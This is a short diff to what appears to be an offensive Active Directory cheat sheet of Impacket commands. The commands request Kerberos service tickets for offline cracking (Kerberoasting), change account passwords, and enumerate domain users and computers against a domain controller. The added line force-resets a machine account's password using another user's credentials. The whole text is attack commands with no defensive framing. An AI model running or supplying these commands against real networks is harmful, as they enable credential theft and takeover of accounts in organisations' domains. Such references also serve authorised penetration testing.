@@ -356,6 +356,7 @@ ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -s
 
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
 impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET -newpass '123qweasdF!' -p kpasswd
+impacket-changepasswd -dc-ip $TARGET $DOM/'ADMWS01$'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
 impacket-changepasswd -dc-ip $TARGET $DOM/ -k -no-pass -p kpasswd
 impacket-GetADUsers -dc-ip $TARGET $DOM/ -k -no-pass -all
 impacket-GetADComputers -dc-ip $TARGET $DOM/ -k -no-pass
